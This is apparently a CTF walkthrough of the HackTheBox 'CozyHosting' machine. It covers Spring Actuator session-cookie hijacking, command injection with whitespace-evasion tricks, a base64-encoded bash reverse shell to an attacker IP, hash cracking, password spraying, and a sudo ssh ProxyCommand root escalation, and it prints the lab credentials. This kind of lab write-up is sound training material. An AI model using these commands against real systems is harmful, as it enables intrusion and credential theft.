---
title: CozyHosting
date: 2025-06-04
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, Spring, Spring-Boot, cookie-authentication, command-injection, IFS-expansion , brace-expansion, PostgreSQL, sudo-ssh-privesc] 
image: cozy.png
media_subpath: /assets/img/posts/2025-06-14-cozyhostingHTB/
---

## Introduction

CozyHosting is an **easy-difficulty Linux machine** featuring a vulnerable **Spring Boot** application with the **Actuator endpoint** exposed. By enumerating this endpoint, a **user session cookie** was discovered, providing access to the dashboard. The application suffers from a **command injection vulnerability**, which was exploited to gain a **reverse shell**. Inspecting the JAR file revealed **hardcoded database credentials**, which granted access to a database containing a **hashed user password**. After cracking the hash, access as `josh` was gained. The user had `sudo` rights to execute `ssh` as root, enabling full **privilege escalation**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - nginx 1.18.0 (Ubuntu)

Add the domain to `/etc/hosts` file.

Gobutser Scan

```powershell
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/common.txt -t 30 -b 400,403,404
```

![image.png](image%202.png)

```bash
gobuster dir -u http://$IP:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -b 400,403,404
```

![image.png](image%203.png)

**Vhost Fuzzing**

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://cozyhosting.htb/ -H 'Host: FUZZ.cozyhosting.htb'
```

![image.png](image%204.png)

## Exploitation

From as `error` directory returned `500` status code, we should take a look there, try HTTP Verb Tampering and try to enumerate it. `A Whitelabel Error Page` is a default error page displayed by Spring Boot applications when an exception occurs that hasn't been handled. 

Here is the [method](https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/) for pentesting Spring applications. Let’s use wordlist aligned with application type as there a specific wordlist tied for Spring Boot applications in `seclists`.

```bash
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -t 30 -b 400,403,404
```

![image.png](image%205.png)

Accessing `/actuator/sessions` I see a hashes:

![image.png](image%206.png)

I tried cracking them but that didn’t work out, I think they are cookies. I am gonna set the `kanderson` user cookie and try to access `admin` panel.

After setting the cookie I am able to access `admin` endpoint:

![image.png](image%207.png)

At the bottom of the page I see connection settings, where it asks for `Hostname` and `Username`. It is a good candidate for trying to perform `SSRF`.

![image.png](image%208.png)

![image.png](image%209.png)

This is a typical error returned when trying to login to the host using `SSH` keys. Most probably the app executes the following command:

```bash
ssh -i <key> <username>@$IP
```

![image.png](image%2010.png)

The same error. If it really executed the above mentioned command, we can try to abuse command injection vulnerability, as is strictly checks for hostname:

![image.png](image%2011.png)

I am gonna try to inject a command in username.

```bash
sudo tcpdump -i tun0 icmp
```

![image.png](image%2012.png)

![image.png](image%2013.png)

We should evade whitespaces.

Using Brace Expansion I was able to execute commands on the remote host:

![image.png](image%2014.png)

![image.png](image%2015.png)

Let’s return a shell.

For some reason I couldn’t get a shell and it kept returning me :

![image.png](image%2016.png)

I am gonna try with IFS expansion.

```bash
echo -n 'bash -c "bash -i >&/dev/tcp/10.10.14.14/80 0>&1"' | base64
echo <base64-value>| base64 -d |bash
```

![image.png](image%2017.png)

![image.png](image%2018.png)

## Shell as app

I see `cloudhosting-0.0.1.jar` file, as `jar` file is zip file I am gonna unzip it.

```bash
unzip cloudhosting-0.0.1.jar
```

Permission denied, let’s unzip it to other directory.

```bash
unzip cloudhosting-0.0.1.jar -d /tmp/app
```

Checking for sensitive files I found application.properties file may contain PostgreSQL credentials, I read about it in this [post](https://vaadin.com/docs/latest/flow/security/advanced-topics/external-configuration) then in a shell, I found `application.properties` where `PostgreSQL` credentials are stored. 

![image.png](image%2019.png)

```bash
psql -h 127.0.0.1 -p 5432 -U postgres
```

![image.png](image%2020.png)

Shell is bad, but we can be ensured that we are inside PostgreSQL by running help command:

```sql
\? #help
\l #list databases
\c cozyhosting #select database, others are default
\dt #list tables
\d users #describe the users table information
select name, password from users;
```

[PostgreSQL Pentesting](https://exploit-notes.hdks.org/exploit/database/postgresql-pentesting/)

![image.png](image%2021.png)

![image.png](image%2022.png)

I identified that hashes are `bcrypt`using [Hash Type Identifier](https://hashes.com/en/tools/hash_identifier)

Let’s crack it:

```bash
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%2023.png)

Le’t see user with shell:

```bash
cat /etc/passwd | grep sh$
```

![image.png](image%2024.png)

Let’s perform password spray for this accounts the password we found:

```bash
hydra -L users -p manchesterunited  $IP ssh
```

![image.png](image%2025.png)

## Shell as josh

Checking sudo privileges I see:

![image.png](image%2026.png)

[GTFOBins-sudo-ssh](https://gtfobins.github.io/gtfobins/ssh/#sudo)

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

## Credentials

```bash
postgres:Vg&nvzAQ7XxR
josh:manchesterunited
```

## Mitigation

- Disable or secure **Spring Boot Actuator endpoints** in production environments.
- Sanitize all **user inputs** to prevent command injection.
- Avoid **hardcoding credentials** in application binaries or config files.
- Use **hashed and salted passwords**, and enforce strong password policies.
- Restrict `sudo` permissions to **only necessary commands and users**, and audit them regularly.
